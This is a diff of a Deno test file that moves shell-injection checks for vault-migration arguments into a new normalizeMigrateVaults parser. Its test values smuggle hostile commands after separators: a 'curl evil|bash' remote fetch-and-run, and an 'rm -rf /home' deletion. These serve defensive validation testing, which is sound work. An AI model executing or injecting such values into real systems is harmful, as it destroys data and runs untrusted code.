@@ -6,6 +6,7 @@ import {
   buildEnsureWorkerTokenCmd,
   buildServeFlags,
   model,
+  normalizeMigrateVaults,
   redactSecrets,
 } from "./swamp_serve_fleet.ts";
 
@@ -218,32 +219,22 @@ Deno.test("assertHostname accepts a MagicDNS name, rejects injection", () => {
   assertThrows(() => assertHostname("has space.ts.net", "magicDnsName"));
 });
 
-Deno.test("promote args reject shell injection in vaultType and migrateVaults", () => {
-  const promoteArgs = model.methods.promote.arguments;
-  // vaultType with a command separator must be rejected.
-  assertEquals(
-    promoteArgs.safeParse({
-      migrateVaults: ["gitlab"],
-      vaultType: "@zts/aws-ssm; curl evil|bash",
-    }).success,
-    false,
-  );
-  // A migrateVaults element with a separator must be rejected.
-  assertEquals(
-    promoteArgs.safeParse({
-      migrateVaults: ["ok", "my-vault; rm -rf /home"],
-      vaultType: "@zts/aws-ssm",
-    }).success,
-    false,
-  );
-  // Legitimate values validate.
-  assertEquals(
-    promoteArgs.safeParse({
-      migrateVaults: ["gitlab", "anthropic"],
-      vaultType: "@zts/aws-ssm",
-    }).success,
-    true,
-  );
+Deno.test("normalizeMigrateVaults parses JSON strings and rejects injection", () => {
+  // Array passthrough.
+  assertEquals(normalizeMigrateVaults(["gitlab", "anthropic"]), [
+    "gitlab",
+    "anthropic",
+  ]);
+  // JSON-array string (the workflow input shape).
+  assertEquals(normalizeMigrateVaults('["gitlab"]'), ["gitlab"]);
+  // Empty string = none.
+  assertEquals(normalizeMigrateVaults(""), []);
+  assertEquals(normalizeMigrateVaults("[]"), []);
+  // Injection in an element is rejected.
+  assertThrows(() => normalizeMigrateVaults(["ok", "my-vault; rm -rf /home"]));
+  assertThrows(() => normalizeMigrateVaults('["@zts/aws; curl evil"]'));
+  // Non-JSON string is rejected.
+  assertThrows(() => normalizeMigrateVaults("gitlab"));
 });
 
 Deno.test("datastoreType and metachar fields reject shell injection", () => {
